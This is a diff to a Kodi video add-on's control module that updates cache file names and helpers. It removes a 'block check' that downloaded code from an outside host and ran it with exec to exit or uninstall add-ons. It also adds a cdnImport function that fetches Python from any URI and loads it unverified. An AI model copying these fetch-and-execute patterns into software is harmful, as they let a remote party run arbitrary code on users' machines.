@@ -88,6 +88,8 @@ makeFile = xbmcvfs.mkdir
 
 deleteFile = xbmcvfs.delete
 
+deleteDir = xbmcvfs.rmdir
+
 listDir = xbmcvfs.listdir
 
 transPath = xbmc.translatePath
@@ -104,9 +106,9 @@ viewsFile = os.path.join(dataPath, 'views.db')
 
 bookmarksFile = os.path.join(dataPath, 'bookmarks.db')
 
-providercacheFile = os.path.join(dataPath, 'providers.8.db')
+providercacheFile = os.path.join(dataPath, 'providers.9.db')
 
-metacacheFile = os.path.join(dataPath, 'meta.db')
+metacacheFile = os.path.join(dataPath, 'meta.4.db')
 
 cacheFile = os.path.join(dataPath, 'cache.db')
 
@@ -185,7 +187,10 @@ def moderator():
 
     if not infoLabel('Container.PluginName') in netloc: sys.exit()
 
-    if '.strm' in str(infoLabel('ListItem.FileName')): sys.exit()
+
+def metaFile():
+    if condVisibility('System.HasAddon(script.exodus.metadata)'):
+        return os.path.join(xbmcaddon.Addon('script.exodus.metadata').getAddonInfo('path'), 'resources', 'data', 'meta.db')
 
 
 def apiLanguage():
@@ -215,6 +220,25 @@ def version():
     return int(num)
 
 
+def cdnImport(uri, name):
+    import imp
+    from resources.lib.modules import client
+
+    path = os.path.join(dataPath, 'py')
+    path = path.decode('utf-8')
+
+    deleteDir(os.path.join(path, ''), force=True)
+    makeFile(dataPath) ; makeFile(path)
+
+    r = client.request(uri)
+    p = os.path.join(path, name + '.py')
+    f = openFile(p, 'w') ; f.write(r) ; f.close()
+    m = imp.load_source(name, p)
+
+    deleteDir(os.path.join(path, ''), force=True)
+    return m
+
+
 def openSettings(query=None, id=addonInfo('id')):
     try:
         idle()
@@ -225,42 +249,6 @@ def openSettings(query=None, id=addonInfo('id')):
         execute('SetFocus(%i)' % (int(f) + 200))
     except:
         return
-
-
-def do_block_check(uninstall=True):
-    '''
-    This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
-    from build makers that publicly insult or slander TVA's developers and friends. If your build is
-    impacted by this check, you can have it removed by publicly apologizing for your previous statements
-    via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
-    them yourself.
-                                                                                               http://i.imgur.com/TqIEnYB.gif
-                                                                                               TVA developers (and friends)
-    '''
-
-    def do_block_check_cache():
-        try:
-            import urllib2
-            return urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read()
-        except:
-            pass
-
-    try:
-        import sys
-        namespace = {}
-
-        from resources.lib.modules import cache
-        do_check = cache.get(do_block_check_cache, 1)
-
-        exec do_check in namespace
-        if namespace["real_check"](uninstall): 
-            sys.exit()
-        return
-    except SystemExit:
-        sys.exit()
-    except:
-        traceback.print_exc()
-        pass
 
 
 def refresh():
